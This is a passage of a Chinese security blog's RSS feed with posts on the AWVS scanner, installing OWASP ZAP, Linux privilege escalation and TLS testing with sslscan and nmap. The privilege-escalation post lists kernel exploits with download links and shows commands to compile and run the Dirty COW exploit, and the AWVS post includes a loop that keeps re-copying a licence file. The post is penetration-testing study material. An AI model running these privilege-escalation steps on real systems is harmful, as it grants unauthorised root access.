id="3-注意事项"><a href="#3-注意事项" class="headerlink" title="3 注意事项"></a>3 注意事项</h1><p>这里需要注意，这个docker镜像有点小bug:AWVS证书用了一会后容易失效，出现如下图所示。这里我采取的笨方法是一直cp证书，代码如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">" while true ;do cp /home/license_info.json /home/acunetix/.acunetix/data/license/; sleep 1; done; "</span> <span class="token operator">></span> t.sh<span class="token function">chmod</span> 777 t.sh<span class="token function">nohup</span> ./t.sh <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/08/26/scan-awvs-nessus/1604372586478.png" alt="1604372586478"></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/">漏洞扫描</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/scan-awvs-nessus/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ZAP的安装和使用</title>
      <link>https://m01ly.github.io/2020/08/26/scan-zap/</link>
      <guid>https://m01ly.github.io/2020/08/26/scan-zap/</guid>
      <pubDate>Wed, 26 Aug 2020 09:33:07 GMT</pubDate>
      
      <description>&lt;p&gt;官网&lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;https://www.zaproxy.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;较好的教程：&lt;a href=&quot;https://www.wangan.com/docs/802&quot;&gt;https://www.wangan.com/docs/802&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官网可以下载软件，也可安装docker版本的&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>官网<a href="https://www.zaproxy.org/">https://www.zaproxy.org/</a></p><p>较好的教程：<a href="https://www.wangan.com/docs/802">https://www.wangan.com/docs/802</a></p><p>官网可以下载软件，也可安装docker版本的</p><a id="more"></a><h1 id="0-前提"><a href="#0-前提" class="headerlink" title="0 前提"></a>0 前提</h1><p>需要java8的环境，查看java版本命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$java</span> -version<span class="token variable">$which</span> java<span class="token variable">$whereis</span> java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果装了java 7,8 ，当前java 为java7，只需要切换版本即可，即重新设置环境变量</p><p>(2)修改环境变量</p><p>$vi /etc/profile </p><p>设置如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_60<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(3)环境变量生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="1-docker安装ZAP"><a href="#1-docker安装ZAP" class="headerlink" title="1  docker安装ZAP"></a>1  docker安装ZAP</h1><p>进入官网<a href="https://www.zaproxy.org/download/">下载页面</a>，往下拉可以看到docker下载地址，这里我们选择stable，稳定版本，然后按照官网的<a href="https://www.zaproxy.org/docs/docker/about/">guide</a>逐步按照即可。</p><p><img src="/2020/08/26/scan-zap/1604399364254.png" alt="1604399364254"></p><p>(1) 拉取镜像</p><pre class="line-numbers language-bash"><code class="language-bash">docker pull owasp/zap2docker-stable:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/scan-zap/1604399706466.png" alt="1604399706466"></p><p>（2）启动</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -u zap -p 8080:8080 -p 8090:8090 -i owasp/zap2docker-stable zap-webswing.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意一定是<a href="http://10.27.22.92:8080/zap/%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AFhttp://10.27.22.92:8080%E4%BC%9A%E5%87%BA%E7%8E%B0%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E3%80%82%E5%BC%80%E5%A7%8B%E5%87%BA%E7%8E%B0%E6%98%AF%E5%B0%8F%E5%B1%8F%E5%B9%95%EF%BC%8C%E7%82%B9%E5%87%BB%E5%85%A8%E5%B1%8F%E5%8D%B3%E5%8F%AF%E3%80%82">http://10.27.22.92:8080/zap/，如果是http://10.27.22.92:8080会出现输入用户名密码。开始出现是小屏幕，点击全屏即可。</a></p><p><img src="/2020/08/26/scan-zap/1604409202576.png" alt="1604409202576"></p><h1 id="2-直接安装"><a href="#2-直接安装" class="headerlink" title="2 直接安装"></a>2 直接安装</h1><p>适用于可以有界面的终端</p><pre><code>[root@m01ly ~]# wget https://github.com/zaproxy/zaproxy/releases/download/v2.9.0/ZAP_2_9_0_unix.sh</code></pre><p><img src="/2020/08/26/scan-zap/1604405494656.png" alt="1604405494656"></p><p>（2）安装</p><pre><code>[root@m01ly ~]# chmod 777 ZAP_2_9_0_unix.sh[root@m01ly ~]# ./ZAP_2_9_0_unix.sh</code></pre><p>弹出界面：</p><p><img src="/2020/08/26/scan-zap/1604405604464.png" alt="1604405604464"></p><p><img src="/2020/08/26/scan-zap/1604405660783.png" alt="1604405660783"></p><p>默认安装路径位于/usr/local/zaproxy中，同时在用户目录下存在一个文件，位置为/home/admin/.ZAP，里面存放了软件的配置文件(config.xml)、脚本文件（community-scripts)、插件文件（plugin）、策略配置文件（policies）、远程调用会话保存目录（session）、本地启动文件会话（sessions）等重要文件；<strong>注意每次软件关闭时候，就会保存配置</strong>，所以配置文件的内容是最后一次软件关闭前的配置 </p><p><img src="/2020/08/26/scan-zap/1604405876783.png" alt="1604405876783"></p><p>执行zap.sh</p><pre><code>[root@m01ly zaproxy]# ./zap.sh</code></pre><p>在虚拟机之外弹出了ZAP，说实话第一次安装有点吓一跳。</p><p><img src="/2020/08/26/scan-zap/1604406130388.png" alt="1604406130388"></p><p>这里注意如果是堡垒机去安装，则不适合这种安装方式，会出现如图所示的错误，最好选择docker版本的。</p><p><img src="/2020/08/26/scan-zap/1604407388145.png" alt="1604407388145"></p><pre><code>./zap.sh -daemon</code></pre><p>虽然启动成功， 但却无法在linux上启动后直接打开zap程序 </p><h1 id="3-特性"><a href="#3-特性" class="headerlink" title="3 特性"></a>3 特性</h1><p>缺点：报告格式仅仅支持html,xml不支持csv,excel。</p><p>优点：集扫描，拦截（bp的功能），使用于个人渗透测试。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/528e6ffd6d29">ZAP使用教程</a></p><p><a href="https://www.cnblogs.com/haohao111/p/11769727.html">安装教程</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/">漏洞扫描</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/scan-zap/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>提权</title>
      <link>https://m01ly.github.io/2020/08/26/pt-tiquan/</link>
      <guid>https://m01ly.github.io/2020/08/26/pt-tiquan/</guid>
      <pubDate>Wed, 26 Aug 2020 08:34:27 GMT</pubDate>
      
      <description>&lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>待完善</p><a id="more"></a><pre><code>wget https://github.com/mzet-/linux-exploit-suggesterchmod 777 les.sh./les.sh</code></pre><p><img src="/2020/08/26/pt-tiquan/1604483327437.png" alt="1604483327437"></p><pre><code>Available information:Kernel version: 3.10.0Architecture: x86_64Distribution: RHELDistribution version: 18.04Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performedPackage listing: N/ASearching among:74 kernel space exploits0 user space exploitsPossible Exploits:[+] [CVE-2016-5195] dirtycow   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: probable   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,ubuntu=16.04|14.04|12.04   Download URL: https://www.exploit-db.com/download/40611   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh[+] [CVE-2016-5195] dirtycow 2   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: probable   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;   Download URL: https://www.exploit-db.com/download/40839   ext-url: https://www.exploit-db.com/download/40847   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh[+] [CVE-2019-15666] XFRM_UAF   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc   Exposure: less probable   Download URL:    Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled[+] [CVE-2017-7308] af_packet   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html   Exposure: less probable   Tags: ubuntu=16.04&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at &#39;ext-url&#39; adds support for additional kernels[+] [CVE-2017-6074] dccp   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3   Exposure: less probable   Tags: ubuntu=(14.04|16.04)&#123;kernel:4.4.0-62-generic&#125;   Download URL: https://www.exploit-db.com/download/41458   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass[+] [CVE-2017-1000253] PIE_stack_corruption   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt   Exposure: less probable   Tags: RHEL=6,RHEL=7&#123;kernel:3.10.0-514.21.2|3.10.0-514.26.1&#125;   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c[+] [CVE-2016-2384] usb-midi   Details: https://xairy.github.io/blog/2016/cve-2016-2384   Exposure: less probable   Tags: ubuntu=14.04,fedora=22   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user[+] [CVE-2015-9322] BadIRET   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/   Exposure: less probable   Tags: RHEL&lt;=7,fedora=20   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz[+] [CVE-2015-8660] overlayfs (ovl_setattr)   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/   Exposure: less probable   Tags: ubuntu=(14.04|15.10)&#123;kernel:4.2.0-(18|19|20|21|22)-generic&#125;   Download URL: https://www.exploit-db.com/download/39166[+] [CVE-2015-8660] overlayfs (ovl_setattr)   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/39230[+] [CVE-2014-5207] fuse_suid   Details: https://www.exploit-db.com/exploits/34923/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/34923[+] [CVE-2014-4014] inode_capable   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4   Exposure: less probable   Tags: ubuntu=12.04   Download URL: https://www.exploit-db.com/download/33824[+] [CVE-2014-0196] rawmodePTY   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html   Exposure: less probable   Download URL: https://www.exploit-db.com/download/33516[+] [CVE-2014-0038] timeoutpwn   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html   Exposure: less probable   Tags: ubuntu=13.10   Download URL: https://www.exploit-db.com/download/31346   Comments: CONFIG_X86_X32 needs to be enabled[+] [CVE-2014-0038] timeoutpwn 2   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html   Exposure: less probable   Tags: ubuntu=(13.04|13.10)&#123;kernel:3.(8|11).0-(12|15|19)-generic&#125;   Download URL: https://www.exploit-db.com/download/31347   Comments: CONFIG_X86_X32 needs to be enabled[+] [CVE-2016-0728] keyring   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/   Exposure: less probable   Download URL: https://www.exploit-db.com/download/40003   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</code></pre><h1 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2 漏洞利用"></a>2 漏洞利用</h1><ul><li><p>Windows平台提权漏洞集合：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p>Linux平台提权漏洞集合：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p></li></ul><p>2.1 脏牛利用</p><pre><code>$ gcc -pthread dirtyc0w.c -o dirtyc0w$ ./dirtyc0w foo m00000000000000000</code></pre><p><img src="/2020/08/26/pt-tiquan/1604484107935.png" alt="1604484107935"></p><p><a href="https://blog.csdn.net/prettyX/article/details/103923947">https://blog.csdn.net/prettyX/article/details/103923947</a></p><pre><code>gcc -pthread dirtyroot.c -o dirtyroot</code></pre>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/pt-tiquan/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TLS安全检测小工具</title>
      <link>https://m01ly.github.io/2020/08/26/htps-tools/</link>
      <guid>https://m01ly.github.io/2020/08/26/htps-tools/</guid>
      <pubDate>Wed, 26 Aug 2020 08:34:27 GMT</pubDate>
      
      <description>&lt;p&gt;工作中需要检测服务所用的TLS套件版本等，可以用以下几种工具&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>工作中需要检测服务所用的TLS套件版本等，可以用以下几种工具</p><a id="more"></a><h2 id="1-工具汇总"><a href="#1-工具汇总" class="headerlink" title="1 工具汇总"></a>1 工具汇总</h2><p><strong>ssllabs</strong><br>强烈推荐这个网站,简洁直观,非常好<br><a href="https://www.ssllabs.com/">https://www.ssllabs.com/</a></p><p><strong>htbridge</strong><br>这个网站检测全面,SSL检测项目更新最快<br><a href="https://www.htbridge.com/ssl/">https://www.htbridge.com/ssl/</a></p><p><strong>myssl</strong><br>这个网站是中国特供,国内访问速度最快,并提供对各大国产浏览器的SSL检测<br><a href="https://myssl.com/">https://myssl.com</a></p><p><strong>testssl</strong> </p><p>非常全的工具 <a href="https://testssl.sh/">https://testssl.sh/</a> </p><h2 id="2-sslscan"><a href="#2-sslscan" class="headerlink" title="2  sslscan"></a>2  sslscan</h2><ul><li>是否支持TLS Fallback SCSV</li><li>是否支持压缩</li><li>是否有心脏滴血漏洞（heartbleed）</li><li>支持的密码套件（及服务器优选的preferred, 红色表示不安全算法，黄色代表中等强度的算法 ）</li><li>证书信息</li></ul><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h3><p>（1）下载源码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git clone https://github.com/rbsec/sslscan</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）进入目录</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localname~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd sslscan</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）编译安装</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localname sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># make static</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查看是否编译成功</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localhost sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#./sslscan -version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/htps-tools/1597831322514.png" alt="1597831322514"></p><h3 id="2-2-使用"><a href="#2-2-使用" class="headerlink" title="2.2 使用"></a>2.2 使用</h3><p> [root@localhost sslscan]# ./sslscan –tlsall <a href="http://www.baidu.com:443/">www.baidu.com:443</a></p><p>​    OR</p><p>  [root@localhost sslscan]# ./sslscan –tlsall 192.168.5.200   —-假如192.168.5.200是你的服务器IP</p><p>​    PS：上述两个命令的前提是能够ping通。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./sslscan --tlsall www.baidu.com:443</span>Version: 2.0.0-staticOpenSSL 1.1.1h-dev  xx XXX xxxxConnected to 180.97.34.96Testing SSL server www.baidu.com on port 443 using SNI name www.baidu.com  SSL/TLS Protocols:TLSv1.0   enabledTLSv1.1   enabledTLSv1.2   enabledTLSv1.3   disabled  TLS Fallback SCSV:Server supports TLS Fallback SCSV  TLS renegotiation:Secure session renegotiation supported  TLS Compression:Compression disabled  Heartbleed:TLSv1.2 not vulnerable to heartbleedTLSv1.1 not vulnerable to heartbleedTLSv1.0 not vulnerable to heartbleed  Supported Server Cipher<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  AES128-SHA                   Accepted  TLSv1.2  256 bits  AES256-SHA                   Accepted  TLSv1.2  128 bits  RC4-SHA                      Preferred TLSv1.1  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.1  128 bits  AES128-SHA                   Accepted  TLSv1.1  256 bits  AES256-SHA                   Accepted  TLSv1.1  128 bits  RC4-SHA                      Preferred TLSv1.0  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.0  128 bits  AES128-SHA                   Accepted  TLSv1.0  256 bits  AES256-SHA                   Accepted  TLSv1.0  128 bits  RC4-SHA                        Server Key Exchange Group<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:TLSv1.2  128 bits  secp256r1 <span class="token punctuation">(</span>NIST P-256<span class="token punctuation">)</span>  Server Signature Algorithm<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:TLSv1.2  Server accepts all signature algorithms.  SSL Certificate:Signature Algorithm: sha256WithRSAEncryptionRSA Key Strength:    2048Subject:  baidu.comAltnames: DNS:baidu.com, DNS:baifubao.com, DNS:www.baidu.cn, DNS:www.baidu.com.cn, DNS:mct.y.nuomi.com, DNS:apollo.auto, DNS:dwz.cn, DNS:*.baidu.com, DNS:*.baifubao.com, DNS:*.baidustatic.com, DNS:*.bdstatic.com, DNS:*.bdimg.com, DNS:*.hao123.com, DNS:*.nuomi.com, DNS:*.chuanke.com, DNS:*.trustgo.com, DNS:*.bce.baidu.com, DNS:*.eyun.baidu.com, DNS:*.map.baidu.com, DNS:*.mbd.baidu.com, DNS:*.fanyi.baidu.com, DNS:*.baidubce.com, DNS:*.mipcdn.com, DNS:*.news.baidu.com, DNS:*.baidupcs.com, DNS:*.aipage.com, DNS:*.aipage.cn, DNS:*.bcehost.com, DNS:*.safe.baidu.com, DNS:*.im.baidu.com, DNS:*.baiducontent.com, DNS:*.dlnel.com, DNS:*.dlnel.org, DNS:*.dueros.baidu.com, DNS:*.su.baidu.com, DNS:*.91.com, DNS:*.hao123.baidu.com, DNS:*.apollo.auto, DNS:*.xueshu.baidu.com, DNS:*.bj.baidubce.com, DNS:*.gz.baidubce.com, DNS:*.smartapps.cn, DNS:*.bdtjrcv.com, DNS:*.hao222.com, DNS:*.haokan.com, DNS:*.pae.baidu.com, DNS:*.vd.bdstatic.com, DNS:click.hm.baidu.com, DNS:log.hm.baidu.com, DNS:cm.pos.baidu.com, DNS:wn.pos.baidu.com, DNS:update.pan.baidu.comIssuer:   GlobalSign Organization Validation CA - SHA256 - G2Not valid before: Apr  2 07:04:58 2020 GMTNot valid after:  Jul 26 05:31:02 2021 GMT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-sslscan原理"><a href="#2-3-sslscan原理" class="headerlink" title="2.3 sslscan原理"></a>2.3 sslscan原理</h3><p> ① sslscan通过创建多个https的连接来试探服务器支持的加密方式；</p><p>   ② 当使用https连接到服务器的时候，会交换双方所支持的加密方式，之后选择双发都能支持的方式进行通信；</p><p>​      如果https服务器配置不当，就会存在MITM攻击，攻击者就可以通过客户端支持的弱加密算法来欺骗服务器；</p><p>​      假如使用的是SSLV2的56位DES，当攻击者拦截并使用了这种加密流量过后，可能在很短时间之内就能够破解加密密钥。</p><h3 id="2-4-功能"><a href="#2-4-功能" class="headerlink" title="2.4 功能"></a>2.4 功能</h3><p> ① sslscan能够检测heartbleed，这是一个openssl的漏洞；</p><p>​      heartbleed漏洞存在于OpenSSL TSL中，它由一个缓冲区导致，允许从内存中读取数据；实际上，Heartbleed 可以在任何未装补丁的支持 TLS 的 OpenSSL （1.0.1 到 1.0.1f 之间）服务器上利用；它从服务器内存中读取 64 KB 的纯文本数据，这能够重复执行，服务器上不会留下任何踪迹或日志。 这意味着攻击者可以从服务器读取纯文本信息，包括服务器的的私钥或者加密方式，会话 Cookie 或 HTTPS 请求会包含用户的密码或其它敏感信息。</p><h2 id="3-nmap"><a href="#3-nmap" class="headerlink" title="3 nmap"></a>3 nmap</h2><p> <a href="https://jumpnowtek.com/security/Using-nmap-to-check-certs-and-supported-algos.html">https://jumpnowtek.com/security/Using-nmap-to-check-certs-and-supported-algos.html</a> </p><p>查看证书</p><p>支持的密码套件</p><p>检测漏洞：心脏滴血 Poodle drown 等漏洞</p><h3 id="3-1-安装"><a href="#3-1-安装" class="headerlink" title="3.1 安装"></a>3.1 安装</h3><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> nmap    <span class="token comment" spellcheck="true">#输入y安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-使用"><a href="#3-2-使用" class="headerlink" title="3.2 使用"></a>3.2 使用</h3><p>（1）查看证书nmap –script ssl-cert -p 443 baidu.com</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># nmap --script ssl-cert -p 443 baidu.com</span>Starting Nmap 6.40 <span class="token punctuation">(</span> http://nmap.org <span class="token punctuation">)</span> at 2020-08-20 16:22 CSTNmap scan report <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>39.156.69.79<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0085s latency<span class="token punctuation">)</span>.Other addresses <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>not scanned<span class="token punctuation">)</span>: 220.181.38.148PORT    STATE SERVICE443/tcp <span class="token function">open</span>  https<span class="token operator">|</span> ssl-cert: Subject: commonName<span class="token operator">=</span>www.baidu.cn/organizationName<span class="token operator">=</span>BeiJing Baidu Netcom Science Technology Co., Ltd/stateOrProvinceName<span class="token operator">=</span>Beijing/countryName<span class="token operator">=</span>CN<span class="token operator">|</span> Issuer: commonName<span class="token operator">=</span>DigiCert SHA2 Secure Server CA/organizationName<span class="token operator">=</span>DigiCert Inc/countryName<span class="token operator">=</span>US<span class="token operator">|</span> Public Key type: rsa<span class="token operator">|</span> Public Key bits: 2048<span class="token operator">|</span> Not valid before: 2020-02-27T00:00:00+00:00<span class="token operator">|</span> Not valid after:  2021-02-26T12:00:00+00:00<span class="token operator">|</span> MD5:   d0cf b084 759f 231b 9b22 c197 6bd5 d271<span class="token operator">|</span>_SHA-1: e357 f6c5 b7d3 7464 8055 89c9 3797 c98d 9d38 2497Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.60 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）查看支持的TLS密码套件nmap –script ssl-enum-ciphers -p 443 baidu.com</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># nmap --script ssl-enum-ciphers -p 443 baidu.com</span>Starting Nmap 6.40 <span class="token punctuation">(</span> http://nmap.org <span class="token punctuation">)</span> at 2020-08-20 16:23 CSTNmap scan report <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>220.181.38.148<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0093s latency<span class="token punctuation">)</span>.Other addresses <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>not scanned<span class="token punctuation">)</span>: 39.156.69.79PORT    STATE SERVICE443/tcp <span class="token function">open</span>  https<span class="token operator">|</span> ssl-enum-ciphers: <span class="token operator">|</span>   SSLv3: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.0: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.1: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - 